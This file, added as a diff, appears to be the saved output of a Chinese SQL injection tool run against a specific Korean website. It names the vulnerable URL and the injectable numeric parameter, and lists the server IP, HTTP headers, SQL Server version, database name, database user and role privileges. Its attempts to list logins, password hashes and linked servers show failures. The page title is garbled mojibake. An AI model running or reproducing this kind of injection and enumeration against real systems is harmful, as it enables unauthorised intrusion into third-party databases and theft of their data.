@@ -1,0 +1,71 @@
+■漏洞信息:============================================================
+ ·URL:http://spnent.com/community/community_view.asp?id=notice&idx=3
+ ·页面标题：***** 缴器聪 浚磐抛牢刚飘俊 坷脚 巴阑 券康钦聪促 *****
+ ·参数:id=notice&idx=3
+ ·方法:GET
+ ·类型:Numeric
+ ·利用方法:And
+ ·脚本语言:asp
+ ·IP:211.235.228.28
+ ·数据库:SQL Server
+ ·HEAD:
+HTTP/1.1 200 OK
+Connection: close
+Date: Sun, 03 Apr 2011 11:32:33 GMT
+Server: WWW Server/1.1 
+X-Powered-By: ASP.NET
+Content-Length: 12925
+Content-Type: text/html
+Set-Cookie: ASPSESSIONIDCSTRQSBQ=DAMPHMGDKODFEBCIFMHOADHG; path=/
+Cache-control: private
+
+
+
+■数据库信息:============================================================
+- 数据库名：spnent
+- 用户名：spnent_user
+- 版本：Microsoft SQL Server  2000 - 8.00.2055 (Intel X86) 
+	Dec 16 2008 19:46:53 
+	Copyright (c) 1988-2003 Microsoft Corporation
+	Standard Edition on Windows NT 5.2 (Build 3790: Service Pack 2)
+
+- 服务器名：HAN
+- 服务名：MSSQLSERVER
+- 系统用户名：spnent_user
+
+ ·当前用户权限：
+sysadmin(sa): 0
+dbcreator): 0
+bulkadmin: 0
+diskadmin: 0
+serveradmin: 0
+public: 1
+db_owner: 1
+db_backupoperator: 0
+db_datawriter: 0
+
+ ·数据库信息:
+db_name	filename
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·SQL Server用户名列表：
+用户名		角色		安全编号
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库相关进程信息:
+程序名	状态	主机名	主机进程ID	命令行	NT用户名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·链接的服务器信息:
+服务器名	服务器产品	提供者名	数据源	位置	服务器网络名
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
+ ·数据库用户登录信息：
+用户名	密码HASH	数据库编号	语言	时间1	时间2
+----------------------------------------------------------------------------------------------------
+取记录数失败，使用设定值：5
+
